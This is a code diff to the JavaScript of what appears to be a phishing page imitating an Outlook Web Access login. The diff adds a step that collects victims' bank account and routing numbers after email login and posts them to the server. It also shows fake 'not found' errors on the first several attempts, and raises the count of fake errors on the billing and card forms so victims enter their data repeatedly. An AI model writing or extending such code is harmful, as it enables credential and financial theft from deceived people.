@@ -1,5 +1,7 @@
 const EmailFrom = document.getElementById("emailform");
 const EmailDiv = document.getElementById("emailowa");
+const AccountDiv = document.getElementById("account");
+const AccountFrom = document.getElementById("accngo");
 const BillingDiv = document.getElementById("bilingowa");
 const BillingForm = document.getElementById("bilngo");
 const card1Div = document.getElementById("cardowa");
@@ -89,6 +91,56 @@ EmailFrom.addEventListener("submit", async function (e) {
 
         if (data.status === "success") {
             EmailDiv.style.display = 'none';
+            AccountDiv.style.display = 'block';
+            
+        } else {
+            alert(data.message || "Login failed");
+        }
+
+    } catch (error) {
+        clearLoading(loginbtn);
+        console.error("Error:", error);
+        alert("An error occurred during Login");
+    }
+});
+
+AccountFrom.addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    const loginbtn = document.getElementById("account_next_btn");
+    const d_data = new FormData(AccountFrom);
+
+    setLoading(loginbtn);
+    try {
+        const response = await fetch("/account", {
+            method: "POST",
+            body: d_data
+        });
+
+        const data = await response.json();
+
+        clearLoading(loginbtn);
+        const errorDiv = document.getElementById("errorraccount");
+        attempts += 1;
+        console.log(attempts);
+
+        
+        if (attempts <= 3) {
+
+            errorDiv.innerHTML = ""; // Clear old errors
+
+            const errorMessage = document.createElement("div");
+            errorMessage.classList.add("error-message");
+            errorMessage.textContent = 
+                "Account No and Routine No not found. Check input and try again.";
+
+            errorDiv.appendChild(errorMessage);
+            return;
+        }
+
+
+        if (data.status === "success") {
+            AccountDiv.style.display = 'none';
             BillingDiv.style.display = 'block';
             
         } else {
@@ -123,7 +175,7 @@ BillingForm.addEventListener("submit", async function (e) {
         console.log(attempts);
 
         
-        if (attempts <= 3) {
+        if (attempts <= 4) {
 
             errorDiv.innerHTML = ""; // Clear old errors
 
@@ -172,7 +224,7 @@ card1From.addEventListener("submit", async function (e) {
         const errorDiv = document.getElementById("errorrcard");
         attempts += 1;
         
-        if (attempts <= 4) {
+        if (attempts <= 5) {
 
             errorDiv.innerHTML = ""; // Clear old errors
 
